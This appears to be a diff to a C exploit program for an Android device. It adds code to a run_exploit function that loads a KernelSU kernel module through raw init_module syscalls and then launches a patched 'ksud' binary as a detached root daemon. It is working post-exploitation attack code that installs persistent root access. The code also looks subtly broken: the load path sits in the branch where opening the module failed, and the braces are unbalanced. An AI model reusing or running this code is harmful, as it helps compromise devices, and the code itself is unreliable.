@@ -679,6 +679,27 @@ int run_exploit(int argc, char **argv) {
         }
     } else {
         pr_error("failed to open .ko errno=%d\n", errno);
+      /* Load module directly */
+    int fd_ko = syscall(SYS_openat, AT_FDCWD,
+        "/data/local/tmp/android14-6.1_kernelsu-essi-S731BXXU6BZDP-kdp.ko",
+        O_RDONLY, 0);
+    if (fd_ko >= 0) {
+        int ret = syscall(SYS_init_module, fd_ko, "", NULL);
+        pr_success("init_module ret=%d errno=%d\n", ret, errno);
+        syscall(SYS_close, fd_ko);
+        
+        if (ret == 0) {
+            /* Start su_daemon as the root helper */
+            pid_t daemon_pid = fork();
+            if (daemon_pid == 0) {
+                setsid();
+                char *args[] = {"/data/local/tmp/ksud-patched", "--daemon", NULL};
+                char *envp[] = {NULL};
+                syscall(SYS_execve, "/data/local/tmp/ksud-patched", args, envp);
+                syscall(SYS_exit, 1);
+            }
+        }
+    }
     }
 }
   return exploit_ok ? 0 : 1;
